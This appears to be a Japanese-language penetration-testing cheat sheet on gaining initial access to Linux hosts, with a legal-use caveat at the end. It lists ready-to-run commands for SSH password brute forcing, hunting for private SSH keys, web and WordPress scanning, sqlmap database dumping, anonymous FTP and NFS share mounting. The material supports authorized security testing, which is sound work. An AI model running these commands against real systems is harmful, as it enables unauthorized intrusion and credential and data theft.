# Linux Initial Access Techniques

## SSH攻撃

### SSH ブルートフォース
```bash
# Hydra を使用したSSHブルートフォース
hydra -l root -P /path/to/passwords.txt ssh://target-ip

# Medusa を使用したSSHブルートフォース
medusa -h target-ip -U users.txt -P passwords.txt -M ssh
```

### SSH鍵の列挙と再利用
```bash
# 既存のSSH鍵の検索
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# SSH鍵の権限変更
chmod 600 id_rsa
ssh -i id_rsa user@target-ip
```

## Web攻撃

### Webアプリケーション脆弱性スキャン
```bash
# Nikto スキャン
nikto -h http://target-ip

# WPScan（WordPressの場合）
wpscan --url http://target-ip --enumerate u,p,t
```

### SQLインジェクション
```bash
# SQLmap を使用した自動化スキャン
sqlmap -u "http://target-ip/page.php?id=1" --dbs
sqlmap -u "http://target-ip/page.php?id=1" -D database_name --tables
sqlmap -u "http://target-ip/page.php?id=1" -D database_name -T users --dump
```

## 公開サービス攻撃

### FTP 匿名アクセス
```bash
# 匿名FTPアクセスの確認
ftp target-ip
Username: anonymous
Password: anonymous

# FTPサーバースキャン
nmap -p21 --script ftp-* target-ip
```

### NFS共有マウント
```bash
# 利用可能なNFS共有の列挙
showmount -e target-ip

# NFS共有のマウント
mkdir /tmp/mount
mount -t nfs target-ip:/share /tmp/mount
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- 実際の攻撃に使用することは違法です
- ターゲットシステムに重大な影響を与える可能性があるため、慎重に実行してください 